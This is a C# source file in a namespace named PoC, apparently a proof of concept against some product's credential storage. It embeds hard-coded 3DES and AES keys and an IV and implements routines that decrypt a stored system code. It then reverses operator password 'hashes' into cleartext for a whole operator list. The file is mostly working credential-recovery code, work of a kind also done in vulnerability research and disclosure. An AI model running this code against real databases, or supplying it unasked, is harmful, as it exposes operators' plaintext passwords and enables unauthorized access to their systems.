using System.Security.Cryptography;
using System.Text;

namespace PoC;

public class CryptoUtils
{
    
    
    public static byte[] syscodeExpand(byte[] inputBytes)
    {
        byte[] outputBytes = new byte[8];
        for (int i = 0; i < 4; i++)
        {
            outputBytes[i] = inputBytes[i];
            outputBytes[i + 4] = (byte) ~inputBytes[i];
        }
        return outputBytes;
    }
    
    public static string syscode_to_db(string syscode)
    {

        byte[] syscodeBytes = syscodeExpand(ByteArrayUtils.StringToByteArray(syscode));
    
        SymmetricAlgorithm symmetricAlgorithm = new TripleDESCryptoServiceProvider();
        symmetricAlgorithm.Mode = CipherMode.ECB;
        symmetricAlgorithm.Padding = PaddingMode.None;
        symmetricAlgorithm.Key = new byte[]{0xAA,0xBB,0xCC,0x11,0x22,0x33,0xDD,0xEE,0x44,0x55,0xAB,0x12,0xCD,0x34,0xEF,0x56 };
    
        ICryptoTransform cryptoTransform = symmetricAlgorithm.CreateEncryptor();
        MemoryStream memoryStream = new MemoryStream();
        CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write);
    
        cryptoStream.Write(syscodeBytes,0,8);
        cryptoStream.Flush();
        memoryStream.Position = 0;
        byte[] result = memoryStream.ToArray();
        cryptoStream.Close();

        //Console.WriteLine(ByteArrayToString(result));
        return ByteArrayUtils.ByteArrayToString(result);
    }

    public static string db_to_syscode(string encryptedSyscode)
    {
        byte[] encryptedBytes = ByteArrayUtils.StringToByteArray(encryptedSyscode);

        SymmetricAlgorithm symmetricAlgorithm = new TripleDESCryptoServiceProvider();
        symmetricAlgorithm.Mode = CipherMode.ECB;
        symmetricAlgorithm.Padding = PaddingMode.None;
        symmetricAlgorithm.Key = new byte[]{0xAA,0xBB,0xCC,0x11,0x22,0x33,0xDD,0xEE,0x44,0x55,0xAB,0x12,0xCD,0x34,0xEF,0x56 };

        ICryptoTransform cryptoTransform = symmetricAlgorithm.CreateDecryptor();
        MemoryStream memoryStream = new MemoryStream(encryptedBytes);
        CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read);

        byte[] decryptedBytes = new byte[encryptedBytes.Length];
        int decryptedByteCount = cryptoStream.Read(decryptedBytes, 0, encryptedBytes.Length);

        cryptoStream.Close();

        return ByteArrayUtils.ByteArrayToString(decryptedBytes).Substring(0,8);
    }
    
    
    public static byte[] getPasswordBytes(string password)
    {
        int int_0 = 16; // padd to 16 bytes???
        byte[] encoded = Encoding.Unicode.GetBytes(password);
        Array.Resize(ref encoded, encoded.Length + 1);
        encoded[encoded.Length - 1] = 0x80;
    
        IEnumerable<byte> enumerable = encoded;
    
        int num = enumerable.Count<byte>() % int_0;
        if (num == 0)
        {
            return enumerable.ToArray<byte>();
        }
        return enumerable.Concat(new byte[int_0 - num]).ToArray<byte>();
    }
    
    public static string GetPasswordFromBytes(byte[] passwordBytes)
    {
        // Remove padding added to the password byte array
        int paddingIndex = Array.LastIndexOf<byte>(passwordBytes, 0x80);
        byte[] unpaddedBytes = new byte[paddingIndex];
        Array.Copy(passwordBytes, unpaddedBytes, paddingIndex);

        // Convert the byte array to a string using the appropriate encoding
        string password = Encoding.Unicode.GetString(unpaddedBytes);

        return password;
    }
    
    
public static string hashPassword(string syscode, string password)
{
    byte[] CredentialKey = new byte[]
        { 0x39, 0x85, 0x25, 0x79, 0x8D, 0x0E, 0x91, 0x2B, 0xAC, 0x6F, 0x1D, 0x64, 0xE8, 0xFB, 0xEC, 0xB7 };
    byte[] CredentialIV = new Byte[] 
        { 0x1C, 0x98, 0x58, 0x17, 0xF1, 0x90, 0x60, 0xB3, 0x03, 0x9F, 0x66, 0xAF, 0xBF, 0xE9, 0x39, 0x45 };
    int id_operator = 1;

    byte[] syscodeB = ByteArrayUtils.StringToByteArray(syscode);
    byte[] salt = ByteArrayUtils.XorIntAndByteArray(id_operator, syscodeB);
    byte[] passwordB = getPasswordBytes(password); // array

    SymmetricAlgorithm symmetricAlgorithm = new AesCryptoServiceProvider();
    symmetricAlgorithm.Padding = PaddingMode.None;
    symmetricAlgorithm.Mode = CipherMode.CBC;
    symmetricAlgorithm.Key = CredentialKey;
    symmetricAlgorithm.IV = CredentialIV;

    byte[] cipheredKey = symmetricAlgorithm.CreateEncryptor().TransformFinalBlock(passwordB, 0,passwordB.Length); // array2

    byte[] hash = SHA1.Create().ComputeHash(salt);
    byte[] hashCroped = new byte[16]; // class.byte_0

    Array.Copy(hash, 0, hashCroped, 0, 16);

    byte[] ret = new Byte[cipheredKey.Length]; // xor array2 with byte_0

    for (int i = 0; i < 32; i++)
    {
        ret[i] = (byte)(hashCroped[i % 16] ^ cipheredKey[i]);
    }


    return ByteArrayUtils.ByteArrayToString(ret);
}

public static string unhashPassword(string passwordHash, string cipheredsyscode)
{
    
    byte[] CredentialKey = new byte[]
        { 0x39, 0x85, 0x25, 0x79, 0x8D, 0x0E, 0x91, 0x2B, 0xAC, 0x6F, 0x1D, 0x64, 0xE8, 0xFB, 0xEC, 0xB7 };
    byte[] CredentialIV = new Byte[] 
        { 0x1C, 0x98, 0x58, 0x17, 0xF1, 0x90, 0x60, 0xB3, 0x03, 0x9F, 0x66, 0xAF, 0xBF, 0xE9, 0x39, 0x45 };
    int id_operator = 1;
    
    string syscode = db_to_syscode(cipheredsyscode);
    byte[] syscodeB = ByteArrayUtils.StringToByteArray(syscode);
    byte[] salt = ByteArrayUtils.XorIntAndByteArray(id_operator, syscodeB);
    
    
    byte[] hash = SHA1.Create().ComputeHash(salt);
    byte[] hashCroped = new byte[16]; // class.byte_0
    Array.Copy(hash, 0, hashCroped, 0, 16);
    
    // get ciphered key:
    byte[] secret = ByteArrayUtils.StringToByteArray(passwordHash); // length 32
    byte[] cipheredKey = new byte[secret.Length];
    for (int i = 0; i < 32; i++)
    {
        cipheredKey[i] = (byte)(hashCroped[i % 16] ^ secret[i]);
    }
    
    
    // decipher ciphered key
    
    SymmetricAlgorithm symmetricAlgorithm2 = new AesCryptoServiceProvider();
    symmetricAlgorithm2.Padding = PaddingMode.None;
    symmetricAlgorithm2.Mode = CipherMode.CBC;
    symmetricAlgorithm2.Key = CredentialKey;
    symmetricAlgorithm2.IV = CredentialIV;
    
    byte[] cleartext = symmetricAlgorithm2.CreateDecryptor().TransformFinalBlock(cipheredKey, 0,cipheredKey.Length); // array2


    return GetPasswordFromBytes(cleartext);
}

public static void decipherOperatorList(List<Operator> operators, string cipheredSysCode)
{
    foreach (Operator op in operators)
    {
        try
        {
            op.cleartext_password = unhashPassword(op.log_password, cipheredSysCode);
        }
        catch (OverflowException)
        {
            op.cleartext_password = "ERROR RECOVERING";
        }
    }
}
}